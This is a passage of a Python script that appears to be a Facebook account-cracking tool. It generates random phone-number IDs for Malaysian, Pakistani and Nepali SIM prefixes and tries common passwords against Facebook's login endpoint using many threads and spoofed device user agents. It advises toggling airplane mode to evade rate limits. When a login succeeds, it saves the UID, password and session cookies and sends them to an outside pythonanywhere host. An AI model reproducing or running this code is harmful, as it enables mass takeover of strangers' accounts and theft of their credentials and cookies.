        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    ____banner____()
    with ThreadPoolExecutor(max_workers=30) as STM:
        ____banner____()
        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___STM___}')
        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
        for love in user:
            ids = code + love
            tl = len(user)
            psd = plist
            if ___STM___ in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
            elif ___STM___ in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
            elif ___STM___ in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
            elif ___STM___ in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl) 
    print(f'\r{white}================================================')
    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
    zar0()
#====================[MALAYSIA RANDOM]==========================
def ___ML___():
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}01125 01128 01137 01161{red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    mtd=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    plist = []
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('Sri Lanka')
        plist.append('srilanka')
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    ____banner____()
    with ThreadPoolExecutor(max_workers=30) as STM:
        ____banner____()
        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            if mtd in ['A','a','01','1']:STM.submit(randm, ids, plist,tl)
            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, plist,tl)
            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, plist,tl)
            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, plist,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
    zar0()
#====================[PAKISTAN RANDOM]==========================
def ___PK___():
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}0945 0942 {red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    plist = []
    ____banner____()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    mtd=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    ____banner____()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('102030')
        plist.append('203040')
    elif __CH__ in ["B","b","2"]:
        ____banner____()
        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    ____banner____()
    with ThreadPoolExecutor(max_workers=30) as STM:
        ____banner____()
        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
    zar0()
 #====================[NEPAL RANDOM]==========================
def ___NP___():
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}+977 ETC.{red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    plist = []
    ____banner____()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    ____banner____()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD {red}(BEST)");line()
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
    elif __CH__ in ["B","b","2"]:
        ____banner____()
        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    ____banner____()
    with ThreadPoolExecutor(max_workers=60) as STM:
        ____banner____()
        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
    zar0()
#====================[RANDOM M1]==========================
def randm(ids,psd,tl):
    global loop,oks,cps
    sm_mdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
    uaD28 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}zar0{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head ={
                'User-Agent':uaD28,
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False)
            print(po)
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}zar0-OK{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(uid)
                    open('/sdcard/zar0-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {ckkk}")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{ckkk}")
                    break
            elif "www.facebook.com" in q:
                cps.append(ids)
                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/zar0-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
        loop+=1
    except requests.exceptions.ConnectionSTM:
        time.sleep(10)
    except Exception as e:
        pass

user_agents = [
    "[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/225303678;FBCR/T-Mobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2005;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/283.0.0.40.124;FBBV/229291598;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_GB;FBRV/233504613;FBCR/Vodafone;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2025;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/290.0.0.40.126;FBBV/235291590;FBDM/{density=2.75,width=1080,height=2340};FBLC/fr_FR;FBRV/238504643;FBCR/Orange;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2089;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/299.0.0.44.123;FBBV/239927539;FBDM/{density=3.0,width=1080,height=2340};FBLC/es_ES;FBRV/245315816;FBCR/Vivo;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/305.0.0.42.118;FBBV/243200001;FBDM/{density=3.5,width=1080,height=2400};FBLC/de_DE;FBRV/248204612;FBCR/O2;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/315.0.0.39.120;FBBV/255225613;FBDM/{density=3.25,width=1080,height=2340};FBLC/it_IT;FBRV/258504612;FBCR/Three;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/P40 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/320.0.0.44.123;FBBV/261003211;FBDM/{density=3.25,width=1080,height=2460};FBLC/zh_CN;FBRV/266004212;FBCR/China Mobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Reno5 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/330.0.0.39.118;FBBV/270225511;FBDM/{density=2.75,width=1080,height=2376};FBLC/ja_JP;FBRV/275309216;FBCR/SoftBank;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Find X2;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/340.0.0.47.118;FBBV/280003215;FBDM/{density=3.5,width=1080,height=2400};FBLC/ko_KR;FBRV/285104222;FBCR/SKT;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Mate 30 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/345.0.0.44.119;FBBV/285002514;FBDM/{density=4.0,width=1080,height=2412};FBLC/pt_PT;FBRV/295004512;FBCR/Claro;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Nova 7i;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=3.0,width=1080,height=2340};FBLC/ru_RU;FBRV/305209911;FBCR/MegaFon;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/A53;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/360.0.0.44.125;FBBV/305132007;FBDM/{density=3.75,width=1080,height=2400};FBLC/tr_TR;FBRV/310004612;FBCR/Turkcell;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/F17 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/370.0.0.44.119;FBBV/315204899;FBDM/{density=3.5,width=1080,height=2560};FBLC/zh_TW;FBRV/320504202;FBCR/FarEasTone;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Honor 20;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/375.0.0.39.125;FBBV/325002514;FBDM/{density=4.0,width=1080,height=2460};FBLC/en_AU;FBRV/330003512;FBCR/Telstra;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/MatePad Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]"
    "[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/225303678;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/283.0.0.40.124;FBBV/229291598;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/233504613;FBCR/Verizon;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/295.1.0.27.119;FBBV/236570900;FBDM/{density=2.75,width=1440,height=2880};FBLC/fr_FR;FBRV/242050580;FBCR/Orange;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/299.0.0.44.123;FBBV/239927539;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_ES;FBRV/245315816;FBCR/Vodafone;FBMF/LG;FBBD/LG;FBPN/com.facebook.katana;FBDV/LM-G820;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/310.0.0.42.118;FBBV/251202831;FBDM/{density=2.625,width=1080,height=2400};FBLC/de_DE;FBRV/256003681;FBCR/Telekom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi10;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/320.0.0.39.119;FBBV/261112633;FBDM/{density=2.75,width=1080,height=2340};FBLC/it_IT;FBRV/265002842;FBCR/WindTre;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 3 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/330.0.0.47.118;FBBV/270138759;FBDM/{density=2.75,width=1080,height=2340};FBLC/pt_PT;FBRV/275100912;FBCR/Claro;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G8 Power;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/340.0.0.39.118;FBBV/280002379;FBDM/{density=3.0,width=1080,height=2160};FBLC/zh_CN;FBRV/285104109;FBCR/ChinaMobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH1911;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/350.0.0.43.118;FBBV/290025678;FBDM/{density=3.5,width=1080,height=2340};FBLC/ja_JP;FBRV/295309192;FBCR/SoftBank;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Xperia 1;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=4.0,width=1080,height=2280};FBLC/ko_KR;FBRV/305000123;FBCR/SKT;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G970N;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
    "[FBAN/FB4A;FBAV/365.0.0.44.118;FBBV/310204222;FBDM/{density=3.0,width=1080,height=2400};FBLC/ru_RU;FBRV/315309999;FBCR/MegaFon;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme 7 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]"
]

# Function to get a random user agent
def get_random_user_agent():
    return random.choice(user_agents)        
#====================[RANDOM M2]==========================
def randm1(ids,psd,tl):
    global loop,oks,cps
    sm_mdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
